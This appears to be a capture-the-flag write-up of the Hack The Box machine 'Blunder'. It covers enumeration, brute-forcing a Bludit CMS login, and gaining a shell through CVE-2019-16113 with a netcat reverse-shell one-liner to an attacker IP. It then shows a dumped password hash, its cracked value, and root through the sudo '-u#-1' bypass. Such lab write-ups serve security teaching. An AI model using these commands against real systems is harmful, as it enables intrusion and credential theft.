---
featured_image: "/posts/Blunder/blunder.png"
title : HTB 19/20 Blunder
published : true
date: 2021-04-28
description: "Blunder Writeup"
author : PS
---
## Foothold 
*nmap*
```bash
Nmap scan report for 10.10.10.191
Host is up (0.078s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.75 seconds
```
Port 80 :
![img](1.png)
*Lulzbuster*
```bash
[+] game started

[+] code   size   real size   resp time   url

[*] 403 |  277B |      277B | 0.329183s | http://10.10.10.191/.hta
[*] 200 |  563B |      563B | 0.344884s | http://10.10.10.191/.gitignore
[*] 403 |  277B |      277B | 0.335621s | http://10.10.10.191/.htpasswd
[*] 403 |  277B |      277B | 0.336876s | http://10.10.10.191/.htaccess
[*] 200 |    7K |     7562B | 0.291446s | http://10.10.10.191/0
[*] 200 |    1K |     1083B | 0.324683s | http://10.10.10.191/LICENSE
[*] 200 |    3K |     3281B | 0.171624s | http://10.10.10.191/about
[*] 200 |   22B |       22B | 0.188383s | http://10.10.10.191/robots.txt
[*] 403 |  277B |      277B | 0.162765s | http://10.10.10.191/server-status
[*] 200 |    7K |     7562B | 0.189528s | http://10.10.10.191/

[+] game over
```
After running lulzbuster with the default wordlist it is clear that /admin exists and /todo.txt 
```bash
[+] code   size   real size   resp time   url

[*] 200 |    7K |     7562B | 0.327878s | http://10.10.10.191/#
[*] 200 |    7K |     7562B | 0.502401s | http://10.10.10.191/.
[*] 200 |    7K |     7562B | 0.502611s | http://10.10.10.191/./
[*] 200 |    7K |     7562B | 0.662270s | http://10.10.10.191/?
[*] 200 |    7K |     7562B | 0.722391s | http://10.10.10.191/0
[*] 200 |    7K |     7562B | 0.187000s | http://10.10.10.191/%3f/
[*] 200 |    7K |     7562B | 0.173446s | http://10.10.10.191/%3f.jsp
[*] 200 |    3K |     3281B | 0.161648s | http://10.10.10.191/about
[*] 200 |    2K |     2385B | 0.162989s | http://10.10.10.191/admin/
[*] 200 |    2K |     2385B | 0.164423s | http://10.10.10.191/admin/*
[*] 200 |    2K |     2385B | 0.166145s | http://10.10.10.191/admin/access.log
[*] 200 |    2K |     2385B | 0.166516s | http://10.10.10.191/admin/access_log
[*] 200 |    2K |     2385B | 0.161443s | http://10.10.10.191/admin/access.txt
[*] 200 |    2K |     2385B | 0.164692s | http://10.10.10.191/admin/account
[*] 200 |    2K |     2385B | 0.167687s | http://10.10.10.191/admin/account.brf
[*] 200 |    2K |     2385B | 0.167639s | http://10.10.10.191/admin/account.cgi
[*] 200 |    2K |     2385B | 0.171629s | http://10.10.10.191/admin/account.cfm
[*] 200 |    2K |     2385B | 0.170110s | http://10.10.10.191/admin/account.jsp
[*] 200 |    2K |     2385B | 0.170854s | http://10.10.10.191/admin/account.php
[*] 200 |    2K |     2385B | 0.178690s | http://10.10.10.191/admin/account.asp
```
```bash
\-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```
Well we have a username : fergus
Well this is the last time  I am gonna use common.txt as wordlist , :D  
![img](2.png)
The source code reveals the version of the bludit : 3.9.2 which has lots of exploit
![img](3.png)
PS used CeWL to generate an wordlist :
```bash
>>> cewl 10.10.10.191 > pass.txt
```
Use https://www.exploit-db.com/exploits/48942 to brute force the password
```bash
>>> python 48942.py -l http://10.10.10.191/admin/login -u user.txt -p pass.txt
[*] Bludit Auth BF Mitigation Bypass Script by ColdFusionX 
     
...cut for size...
[.......\] Brute Force: Testing -> fergus:Contribution
[↑] Brute Force: Testing -> fergus:Letters
[◥] Brute Force: Testing -> fergus:probably
[↗] Brute Force: Testing -> fergus:best
[o] Brute Force: Testing -> fergus:fictional
[|] Brute Force: Testing -> fergus:character
[o] Brute Force: Testing -> fergus:RolandDeschain

[*] SUCCESS !!
[+] Use Credential -> fergus:RolandDeschain
Fatal Python error: _enter_buffered_busy: could not acquire lock for <_io.BufferedWriter name='<stdout>'> at interpreter shutdown, possibly due to daemon threads
Python runtime state: finalizing (tstate=0x555af3e02d00)

Current thread 0x00007f9203699740 (most recent call first):
<no Python frame>
zsh: abort (core dumped)  python 48942.py -l http://10.10.10.191/admin/login -u user.txt -p pass.txt
```

Well we got a password : RolandDeschain  
Now , I saw another exploit which hints the todo.txt stuff 
```bash
-Inform fergus that the new blog needs images - PENDING
```
IMAGES , hmmm  https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-16113  
Since  I am a no metasploit gang  , we will use a github exploit : 
https://github.com/noroh4xy/CVE-2019-16113 
Which fails so we try https://www.exploit-db.com/exploits/48568 :D  
```bash
>>> python 48568.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 6969 >/tmp/f"


╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝

 CVE-2019-16113 CyberVaca


[+] csrf_token: 3e4071ba882c574601f8868ab5bf5f29781e4eb0
[+] cookie: igott9dma13ra23b2dcl5gvaj6
[+] csrf_token: 6446b0726e3e125f1468a2fc2d4cc74a118a9314
[+] Uploading jgzzfscm.jpg
[+] Executing command: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 6969 >/tmp/f
[+] Delete: .htaccess
[+] Delete: jgzzfscm.jpg
```
and we get a reverse shell  
## User
```bash
Connection from 10.10.10.191:43738
/bin/sh: 0: can't access tty; job control turned off
$ ls
thumbnails
$ whoami
www-data
$ 
www-data@blunder:/var/www$ ls
bludit-3.10.0a	bludit-3.9.2  html
www-data@blunder:/var/www$ cd bludit-3.10.0a
www-data@blunder:/var/www/bludit-3.10.0a$ ls
LICENSE    bl-content  bl-languages  bl-themes	install.php
README.md  bl-kernel   bl-plugins    index.php
www-data@blunder:/var/www/bludit-3.10.0a$ cd bl-content
www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ ls
databases  pages  tmp  uploads	workspaces
www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ cd databases
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ ls
categories.php	plugins       site.php	  tags.php
pages.php	security.php  syslog.php  users.php
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat user.php
cat: user.php: No such file or directory
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ 

```
After we crack the password 
```bash
faca404fd5c0a31cf1897b823c695c85cffeb98d -> Password120
```
login into Hugo with su 
```bash
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo 
Password: Password120

hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ 
hugo@blunder:~$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
hugo@blunder:~$ cat user.txt	 
cat: us.txt: No such file or directory
hugo@blunder:~$ cat user.txt
ed5abddd22a3ffce0edc4fc888e8921d
hugo@blunder:~$ 
hugo@blunder:~$ sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
hugo@blunder:~$ 
```
## Root
https://gtfobins.github.io/gtfobins/bash/#sudo
That helped me find https://www.exploit-db.com/exploits/47502
And you get root
```bash
hugo@blunder:~$  sudo -u#-1 /bin/bash
root@blunder:/home/hugo# cd /root
root@blunder:/root# cat root.txt
d868baa46327982d129af5c7547bfce8
root@blunder:/root# 
```
*PS out*
